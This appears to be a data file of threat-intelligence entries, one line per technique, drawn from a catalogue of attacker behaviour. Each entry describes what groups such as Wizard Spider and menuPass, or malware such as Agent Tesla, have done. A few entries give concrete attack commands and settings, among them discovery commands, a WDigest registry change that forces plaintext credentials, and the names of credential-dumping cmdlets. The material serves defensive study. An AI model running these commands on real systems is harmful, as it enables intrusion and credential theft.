Windshift has used icons mimicking MS Office files to mask malicious executables. Windshift has also attempted to hide executables by changing the file extension to ".scr" to mimic Windows screensavers.
Windshift has used string encoding with floating point calculations.
Windshift has used malware to enumerate active processes.
Windshift has created LNK files in the Startup folder to establish persistence.
Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools.
Windshift has used malware to identify installed software.
Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware.
Windshift has sent spearphishing emails with links to harvest credentials and deliver malware.
Windshift has used fake personas on social media to engage and target victims.
Windshift has used malware to identify the computer name of a compromised host.
Windshift has used malware to identify the username on a compromised host.
Windshift has used Visual Basic 6 (VB6) payloads.
Windshift has used tools that communicate with C2 over HTTP.
Windshift has used WMI to collect information about target machines.
Winnti Group used stolen certificates to sign its malware.
Winnti Group has registered domains for C2 that mimicked sites of their intended targets.
Winnti Group has used a program named ff.exe to search for specific documents on compromised hosts.
Winnti Group has downloaded an auxiliary program named ff.exe to infected machines.
Winnti Group looked for a specific process running on infected servers.
Winnti Group used a rootkit to modify typical server functionality.
Wizard Spider has archived data into ZIP files on compromised machines.
Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.
Wizard Spider has used Digicert code-signing certificates for some of its malware.
Wizard Spider has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads.
Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands.
Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules.
Wizard Spider has collected data from a compromised host prior to exfiltration.
Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.
Wizard Spider has identified domain admins through the use of `net group "Domain admins" /DOMAIN`. Wizard Spider has also leveraged the PowerShell cmdlet `Get-ADComputer` to collect account names from Active Directory data.
Wizard Spider has created and used new accounts within a victim's Active Directory environment to maintain persistence.
Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network.
Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.
Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware.
Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.
Wizard Spider has exfiltrated victim information using FTP.
Wizard Spider has exfiltrated stolen victim data to various cloud storage providers.
Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.
Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.
Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use.
Wizard Spider has used PowerShell cmdlets `Get-GPPPassword` and `Find-GPOPassword` to find unsecured credentials in a compromised network group policy.
Wizard Spider can transfer malicious payloads such as ransomware to compromised machines.
Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin.
Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.
Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.
Wizard Spider has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne.
Wizard Spider has used stolen credentials to copy tools into the &lt;code&gt;%TEMP%&lt;/code&gt; directory of domain controllers.
Wizard Spider has created local administrator accounts to maintain persistence in compromised networks.
Wizard Spider has staged ZIP files in local directories such as, `C:\PerfLogs\1\` and `C:\User\1\` prior to exfiltration.
Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar.
Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing.
Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries.
Wizard Spider has modified the Registry key &lt;code&gt;HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest&lt;/code&gt; by setting the &lt;code&gt;UseLogonCredential&lt;/code&gt; registry value to &lt;code&gt;1&lt;/code&gt; in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.
Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database. Wizard Spider has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil.
Wizard Spider has used the “net view” command to locate mapped network shares.
Wizard Spider has used the `Invoke-SMBExec` PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally.
Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network.
Wizard Spider has used process injection to execute payloads to escalate privileges.
Wizard Spider has established persistence via the Registry key &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; and a shortcut within the startup folder.
Wizard Spider has used RDP for lateral movement and to deploy ransomware interactively.
Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares.
Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind, &lt;code&gt;nltest/dclist&lt;/code&gt;, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller.
Wizard Spider has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.
Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.
Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware.
Wizard Spider has acquired credentials from the SAM/SECURITY registry hives.
Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine.
Wizard Spider has used `services.exe` to execute scripts and executables during lateral movement within a victim's network. Wizard Spider has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network.
Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.
Wizard Spider has utilized the PowerShell script `Get-DataInfo.ps1` to collect installed backup software information from a compromised machine.
Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar.
Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.
Wizard Spider has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. Wizard Spider has also utilized the PowerShell cmdlet `Get-ADComputer` to collect DNS hostnames, last logon dates, and operating system information from Active Directory.
Wizard Spider has used ipconfig to identify the network configuration of a victim machine. Wizard Spider has also used the PowerShell cmdlet `Get-ADComputer` to collect IP address data from Active Directory.
Wizard Spider has used "whoami" to identify the local user and their privileges.
Wizard Spider has utilized tools such as Empire, Cobalt Strike, Cobalt Strike, Rubeus, AdFind, BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts.
Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.
Wizard Spider has used HTTP for network communications.
Wizard Spider has used `cmd.exe` to execute commands on a victim's machine.
Wizard Spider has used PowerShell cmdlet `Invoke-WCMDump` to enumerate Windows credentials in the Credential Manager in a compromised network.
Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.
Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally. Wizard Spider has also used batch scripts to leverage WMIC to deploy ransomware.
Wizard Spider has used Window Remote Management to move laterally through a victim network.
Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence.
Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.
ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.
ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.
ZIRCONIUM has purchased domains for use in targeted campaigns.
ZIRCONIUM has exfiltrated files via the Dropbox API C2.
ZIRCONIUM has exfiltrated stolen data to Dropbox.
ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation.
ZIRCONIUM has used tools to download malicious files to compromised hosts.
ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware.
ZIRCONIUM has created a run key named &lt;code&gt;Dropbox Update Setup&lt;/code&gt; to mask a persistence mechanism for a malicious binary.
ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.
ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.
ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails.
ZIRCONIUM has used Python-based implants to interact with compromised hosts.
ZIRCONIUM has used a tool to query the Registry for proxy settings.
ZIRCONIUM has created a Registry Run key named &lt;code&gt;Dropbox Update Setup&lt;/code&gt; to establish persistence for a malicious Python binary.
ZIRCONIUM has used multi-stage packers for exploit code.
ZIRCONIUM has used malicious links in e-mails to deliver malware.
ZIRCONIUM has used web beacons in e-mails to track hits to attacker-controlled URL's.
ZIRCONIUM has used AES encrypted communications in C2.
ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2.
ZIRCONIUM has used a tool to enumerate proxy settings in the target environment.
ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.
ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.
ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails.
ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host.
admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.
admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: &lt;code&gt;dir c:\ &gt;&gt; %temp%\download&lt;/code&gt; &lt;code&gt;dir "c:\Documents and Settings" &gt;&gt; %temp%\download&lt;/code&gt; &lt;code&gt;dir "c:\Program Files\" &gt;&gt; %temp%\download&lt;/code&gt; &lt;code&gt;dir d:\ &gt;&gt; %temp%\download&lt;/code&gt;
admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: &lt;code&gt;net user &gt;&gt; %temp%\download&lt;/code&gt; &lt;code&gt;net user /domain &gt;&gt; %temp%\download&lt;/code&gt;
admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: &lt;code&gt;net localgroup administrator &gt;&gt; %temp%\download&lt;/code&gt;
admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.
admin@338 actors used the following command to rename one of their tools to a benign file name: &lt;code&gt;ren "%temp%\upload" audiodg.exe&lt;/code&gt;
admin@338 has sent emails with malicious Microsoft Office documents attached.
admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: &lt;code&gt;ver &gt;&gt; %temp%\download&lt;/code&gt; &lt;code&gt;systeminfo &gt;&gt; %temp%\download&lt;/code&gt;
admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: &lt;code&gt;ipconfig /all &gt;&gt; %temp%\download&lt;/code&gt;
admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: &lt;code&gt;netstat -ano &gt;&gt; %temp%\download&lt;/code&gt;
admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: &lt;code&gt;net start &gt;&gt; %temp%\download&lt;/code&gt;
Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer.
menuPass has encrypted files and information before exfiltration.
menuPass has compressed files before exfiltration using TAR and RAR.
menuPass has used the Csvde tool to collect Active Directory files and data.
menuPass has used Wevtutil to remove PowerShell execution logs.
menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.
menuPass has used DLL search order hijacking.
menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT.
menuPass has collected various files from the compromised computers.
menuPass has collected data from remote systems by mounting network shares with &lt;code&gt;net use&lt;/code&gt; and using Robocopy to transfer data.
menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used &lt;code&gt;certutil -decode&lt;/code&gt; to decode files on the victim’s machine when dropping UPPERCUT.
menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data.
menuPass has registered malicious domains for use in intrusion campaigns.
menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.
menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.
menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).
menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim.
menuPass has used dynamic DNS service providers to host malicious domains.
A menuPass macro deletes files after it has decoded and decompressed them.
menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.
menuPass has installed updates and new malware on victims.
menuPass has used &lt;code&gt;InstallUtil.exe&lt;/code&gt; to execute malicious software.
menuPass has used key loggers to steal usernames and passwords.
menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.
menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.
menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.
menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files.
menuPass has been seen changing malicious files to appear legitimate.
menuPass has used Ntdsutil to dump credentials.
menuPass has used native APIs including &lt;code&gt;GetModuleFileName&lt;/code&gt;, &lt;code&gt;lstrcat&lt;/code&gt;, &lt;code&gt;CreateFile&lt;/code&gt;, and &lt;code&gt;ReadFile&lt;/code&gt;.
menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest.
menuPass uses PowerSploit to inject shellcode into PowerShell.
menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.
menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration.
menuPass has used RDP connections to move across the victim network.
menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command &lt;code&gt;net view /domain&lt;/code&gt; to a PlugX implant to gather information about remote systems on the network.
menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.
menuPass has used Putty Secure Copy Client (PSCP) to transfer data.
menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.
menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.
menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.
menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.
menuPass has used &lt;code&gt;net use&lt;/code&gt; to conduct connectivity checks to machines.
menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump.
menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.
menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.
menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands. menuPass has used malicious macros embedded inside Office documents to execute files.
menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.
3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory.
3PARA RAT command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&amp;%9&amp;jkMCXuiS. 3PARA RAT will use an 8-byte XOR key derived from the string HYF54&amp;%9&amp;jkMCXuiS if the DES decoding fails
3PARA RAT has a command to set certain attributes such as creation/modification timestamps on files.
3PARA RAT uses HTTP for command and control.
4H RAT has the capability to obtain file and directory listings.
4H RAT has the capability to obtain a listing of running processes (including loaded modules).
4H RAT obfuscates C2 communication using a 1-byte XOR with the key 0xBE.
4H RAT sends an OS version identifier in its beacons.
4H RAT uses HTTP for command and control.
4H RAT has the capability to create a remote shell.
AADInternals can enumerate Azure AD users.
AADInternals can create new Azure AD users.
AADInternals can execute commands on Azure virtual machines using the VM agent.
AADInternals can enumerate Azure AD groups.
AADInternals can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.
AADInternals can gather unsecured credentials for Azure AD services, such as Azure AD Connect, from a local machine.
AADInternals can collect files from a user’s OneDrive.
AADInternals can register a device to Azure AD.
AADInternals can gather information about a tenant’s domains using public Microsoft APIs.
AADInternals can check for the existence of user email addresses using public Microsoft APIs.
AADInternals can directly download cloud user data such as OneDrive files.
AADInternals can inject a malicious DLL (`PTASpy`) into the `AzureADConnectAuthenticationAgentService` to backdoor Azure AD Pass-Through Authentication.
AADInternals can dump secrets from the Local Security Authority.
AADInternals can modify registry keys as part of setting a new pass-through authentication agent.
The AADInternals `Set-AADIntUserMFA` command can be used to disable MFA for a specified user.
AADInternals is written and executed via PowerShell.
AADInternals can gather encryption keys from Azure AD services such as ADSync and Active Directory Federated Services servers.
AADInternals can be used to create SAML tokens using the AD Federated Services token signing certificate.
AADInternals can be used to forge Kerberos tickets using the password hash of the AZUREADSSOACC account.
AADInternals can send "consent phishing" emails containing malicious links designed to steal users’ access tokens.
AADInternals can send phishing emails containing malicious links designed to collect users’ credentials.
AADInternals can steal users’ access tokens via phishing emails containing malicious links.
AADInternals can create and export various authentication certificates, including those associated with Azure AD joined/registered devices.
AADInternals can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. AADInternals can also modify DesktopSSO information.
ABK has the ability to decrypt AES encrypted payloads.
ABK has the ability to download files from C2.
ABK has the ability to inject shellcode into svchost.exe.
ABK has the ability to identify the installed anti-virus product on the compromised host.
ABK can extract a malicious Portable Executable (PE) from a photo.
ABK has the ability to use HTTP in communications with C2.
ABK has the ability to use cmd to run a Portable Executable (PE) on the compromised host.
ADVSTORESHELL encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.
ADVSTORESHELL compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.
A variant of ADVSTORESHELL encrypts some C2 with RSA.
Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.
ADVSTORESHELL exfiltrates data over the same channel used for C2.
ADVSTORESHELL can delete files and directories.
ADVSTORESHELL can list files and directories.
ADVSTORESHELL can perform keylogging.
ADVSTORESHELL stores output from command execution in a .dat file in the %TEMP% directory.
ADVSTORESHELL is capable of setting and deleting Registry values.
ADVSTORESHELL is capable of starting a process using CreateProcess.
Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.
ADVSTORESHELL can list connected devices.
ADVSTORESHELL can list running processes.
ADVSTORESHELL can enumerate registry keys.
ADVSTORESHELL achieves persistence by adding itself to the &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; Registry key.
ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.
ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.
C2 traffic from ADVSTORESHELL is encrypted, then encoded with Base64 encoding.
A variant of ADVSTORESHELL encrypts some C2 with 3DES.
ADVSTORESHELL can run Systeminfo to gather information about the victim.
ADVSTORESHELL connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.
ADVSTORESHELL can create a remote shell and run a given command.
ANDROMEDA can download additional payloads from C2.
ANDROMEDA has been delivered through a LNK file disguised as a folder.
ANDROMEDA has been installed to `C:\Temp\TrustedInstaller.exe` to mimic a legitimate Windows installer service.
ANDROMEDA can inject into the `wuauclt.exe` process to perform C2 actions.
ANDROMEDA can establish persistence by dropping a sample of itself to `C:\ProgramData\Local Settings\Temp\mskmde.com` and adding a Registry run key to execute every time a user logs on.
ANDROMEDA has been spread via infected USB keys.
ANDROMEDA has the ability to make GET requests to download files from C2.
ASPXSpy is a Web shell. The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services (IIS).
AcidRain performs an in-depth wipe of the target filesystem and various attached storage devices through either a data overwrite or calling various IOCTLS to erase it.
AcidRain iterates over device file identifiers on the target, opens the device file, and either overwrites the file or calls various IOCTLS commands to erase it.
AcidRain identifies specific files and directories in the Linux operating system associated with storage devices.
AcidRain reboots the target system once the various wiping processes are complete.
Action RAT can collect local data from an infected machine.
Action RAT can use Base64 to decode actor-controlled C2 server communications.
Action RAT has the ability to collect drive and file information on an infected machine.
Action RAT has the ability to download additional payloads onto an infected machine.
Action RAT's commands, strings, and domains can be Base64 encoded within the payload.
Action RAT can identify AV products on an infected host using the following command: `cmd.exe WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`.
Action RAT has the ability to collect the hostname, OS version, and OS architecture of an infected host.
Action RAT has the ability to collect the MAC address of an infected host.
Action RAT has the ability to collect the username from an infected host.
Action RAT can use HTTP to communicate with C2 servers.
Action RAT can use `cmd.exe` to execute commands on an infected host.
Action RAT can use WMI to gather AV products installed on an infected host.
AdFind can enumerate domain users.
AdFind can enumerate domain groups.
AdFind can gather information about organizational units (OUs) and domain trusts from Active Directory.
AdFind has the ability to query Active Directory for computers.
AdFind can extract subnet information from Active Directory.
Agent Tesla can encrypt data with 3DES before sending it over to a C2 server.
Agent Tesla has the ability to use form-grabbing to extract data from web data forms.
Agent Tesla can steal data from the victim’s clipboard.
Agent Tesla has the ability to extract credentials from configuration or support files.
Agent Tesla has the ability to steal credentials from FTP clients and wireless profiles.
Agent Tesla can gather credentials from a number of browsers.
Agent Tesla has the ability to extract credentials from the Registry.
Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.
Agent Tesla has the capability to kill any running analysis processes and AV software.
Agent Tesla has routines for exfiltration over SMTP, FTP, and HTTP.
Agent Tesla has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.
Agent Tesla has created hidden folders.
Agent Tesla has used &lt;code&gt;ProcessWindowStyle.Hidden&lt;/code&gt; to hide windows.
Agent Tesla can download additional files for execution on the victim’s machine.
Agent Tesla can log keystrokes on the victim’s machine.
Agent Tesla can collect account information from the victim’s machine.
Agent Tesla has used SMTP for C2 communications.
Agent Tesla has been executed through malicious e-mail attachments
Agent Tesla can achieve persistence by modifying Registry key entries.
Agent Tesla has had its code obfuscated in an apparent attempt to make analysis difficult. Agent Tesla has used the Rijndael symmetric encryption algorithm to encrypt strings.
Agent Tesla can list the current running processes on the system.
Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.
Agent Tesla can inject into known, vulnerable binaries on targeted hosts.
Agent Tesla can add itself to the Registry as a startup program to establish persistence.
Agent Tesla has dropped RegAsm.exe onto systems for performing malicious activity.
Agent Tesla  has achieved persistence via scheduled tasks.
Agent Tesla can capture screenshots of the victim’s desktop.
The primary delivered mechanism for Agent Tesla is through email phishing messages.
Agent Tesla can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.
Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.
Agent Tesla can collect the username from the victim’s machine.
Agent Tesla can collect the timestamp from the victim’s machine.
Agent Tesla can access the victim’s webcam and record video.
Agent Tesla has the ability to perform anti-sandboxing and anti-virtualization checks.
Agent Tesla has used HTTP for C2 communications.
Agent Tesla can collect names and passwords of all Wi-Fi networks to which a device has previously connected.
Agent Tesla has used wmi queries to gather information from the system.
Agent.btz saves system information into an XML file that is then XOR-encoded.
Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.
Agent.btz attempts to download an encrypted binary from a specified domain.
Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.
Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.
Agent.btz obtains the victim username and saves it to a file.
Akira encrypts victim filesystems for financial extortion purposes.
Akira examines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such as &lt;code&gt;GetFileAttributesW&lt;/code&gt;.
Akira will delete system volume shadow copies via PowerShell commands.
Akira executes native Windows functions such as &lt;code&gt;GetFileAttributesW&lt;/code&gt; and `GetSystemInfo`.
Akira can identify remote file shares for encryption.
Akira will execute PowerShell commands to delete system volume shadow copies.
Akira verifies the deletion of volume shadow copies by checking for the existence of the process ID related to the process created to delete these items.
Akira uses the &lt;code&gt;GetSystemInfo&lt;/code&gt; Windows function to determine the number of processors on a victim machine.
Akira executes from the Windows command line and can take various arguments for execution.
Akira will leverage COM objects accessed through WMI during execution to evade detection.
Amadey can collect information from a compromised host.
Amadey has decoded antivirus name strings.
Amadey has sent victim data to its C2 servers.
Amadey has used fast flux DNS for its C2.
Amadey has searched for folders associated with antivirus software.
Amadey can download and execute files to further infect a host machine with additional malware.
Amadey has modified the `:Zone.Identifier` in the ADS area to zero.
Amadey has overwritten registry keys for persistence.
Amadey has used a variety of Windows API calls, including `GetComputerNameA`, `GetUserNameA`, and `CreateProcessA`.
Amadey has obfuscated strings such as antivirus vendor names, domains, files, and others.
Amadey has changed the Startup folder to the one containing its executable by overwriting the registry keys.
Amadey has checked for a variety of antivirus products.
Amadey has collected the computer name and OS version from a compromised machine.
Amadey does not run any tasks or install additional malware if the victim machine is based in Russia.
Amadey can identify the IP address of a victim machine.
Amadey has collected the user name from a compromised host using `GetUserNameA`.
Amadey has used HTTP for C2 communications.
Anchor has been signed with valid certificates to evade detection by security tools.
Anchor can install itself as a cron job.
Variants of Anchor can use DNS tunneling to communicate with C2.
Anchor can terminate itself if specific execution flags are not present.
Anchor can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.
Anchor can self delete its dropper after the malware is successfully deployed.
Anchor can download additional payloads.
Anchor has used NTFS to hide files.
Anchor has used ICMP in C2 communications.
Anchor has obfuscated code with stack strings and string encryption.
Anchor can support windows execution via SMB shares.
Anchor can create a scheduled task for persistence.
Anchor can create and execute services to load its payload.
Anchor has come with a packed payload.
Anchor can determine the hostname and linux version on a compromised host.
Anchor can determine the public IP and location of a compromised host.
Anchor can execute payloads via shell scripting.
Anchor has used HTTP and HTTPS in C2 communications.
Anchor has used cmd.exe to run its self deletion routine.
Anchor can establish persistence by creating a service.
AppleJeus has presented the user with a UAC prompt to elevate privileges while installing.
AppleJeus has used a valid digital signature from Sectigo to appear legitimate.
AppleJeus has decoded files received from a C2.
AppleJeus has exfiltrated collected host information to a C2 server.
AppleJeus has deleted the MSI file after installation.
AppleJeus has added a leading &lt;code&gt;.&lt;/code&gt; to plist filenames, unlisting them from the Finder app and default Terminal directory listings.
During AppleJeus's installation process, it uses `postinstall` scripts to extract a hidden plist from the application's `/Resources` folder and execute the `plist` file as a Launch Daemon with elevated permissions.
AppleJeus has placed a plist file within the &lt;code&gt;LaunchDaemons&lt;/code&gt; folder and launched it manually.
AppleJeus has loaded a plist file using the &lt;code&gt;launchctl&lt;/code&gt; command.
AppleJeus has required user execution of a malicious MSI installer.
AppleJeus's spearphishing links required user interaction to navigate to the malicious website.
AppleJeus has been installed via MSI installer.
AppleJeus has XOR-encrypted collected system information prior to sending to a C2. AppleJeus has also used the open source ADVObfuscation library for its components.
AppleJeus has created a scheduled SYSTEM task that runs when a user logs in.
AppleJeus has been distributed via spearphishing link.
AppleJeus has collected the victim host information after infection.
AppleJeus has waited a specified time before downloading a second stage payload.
AppleJeus has used shell scripts to execute commands after installation and set persistence mechanisms.
AppleJeus has sent data to its C2 server via &lt;code&gt;POST&lt;/code&gt; requests.
AppleJeus can install itself as a service.
AppleSeed can gain system level privilege by passing &lt;code&gt;SeDebugPrivilege&lt;/code&gt; to the &lt;code&gt;AdjustTokenPrivilege&lt;/code&gt; API.
AppleSeed has compressed collected data before exfiltration.
AppleSeed can zip and encrypt data collected on a target system.
AppleSeed has automatically collected data from USB drives, keystrokes, and screen images before exfiltration.
AppleSeed has divided files if the size is 0x1000000 bytes or more.
AppleSeed can collect data on a compromised host.
AppleSeed can find and collect data from removable media devices.
AppleSeed can decode its payload prior to execution.
AppleSeed can exfiltrate files via the C2 channel.
AppleSeed has exfiltrated files using web services.
AppleSeed can use a second channel for C2 when the primary channel is in upload mode.
AppleSeed can delete files from a compromised host after they are exfiltrated.
AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.
AppleSeed has the ability to use JavaScript to execute PowerShell.
AppleSeed can use &lt;code&gt;GetKeyState&lt;/code&gt; and &lt;code&gt;GetKeyboardState&lt;/code&gt; to capture keystrokes on the victim’s machine.
AppleSeed can stage files in a central location prior to exfiltration.
AppleSeed can achieve execution through users running malicious file attachments distributed via email.
AppleSeed can disguise JavaScript files as PDFs.
AppleSeed has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.
AppleSeed has the ability to use multiple dynamically resolved API calls.
AppleSeed has the ability to Base64 encode its payload and custom encrypt API calls.
AppleSeed has the ability to execute its payload via PowerShell.
AppleSeed can enumerate the current process on a compromised host.
AppleSeed has the ability to create the Registry key name &lt;code&gt;EstsoftAutoUpdate&lt;/code&gt; at &lt;code&gt;HKCU\Software\Microsoft/Windows\CurrentVersion\RunOnce&lt;/code&gt; to establish persistence.
AppleSeed can call regsvr32.exe for execution.
AppleSeed can take screenshots on a compromised host by calling a series of APIs.
AppleSeed has used UPX packers for its payload DLL.
AppleSeed has been distributed to victims through malicious e-mail attachments.
AppleSeed can identify the OS version of a targeted system.
AppleSeed can identify the IP of a targeted system.
AppleSeed can pull a timestamp from the victim's machine.
AppleSeed has the ability to communicate with C2 over HTTP.
Aria-body has the ability to identify the titles of running windows on a compromised host.
Aria-body has used ZIP to compress data gathered on a compromised host.
Aria-body has the ability to execute a process using &lt;code&gt;runas&lt;/code&gt;.
Aria-body has the ability to collect data from USB devices.
Aria-body has the ability to decrypt the loader configuration and payload DLL.
Aria-body has the ability to use a DGA for C2 communications.
Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.
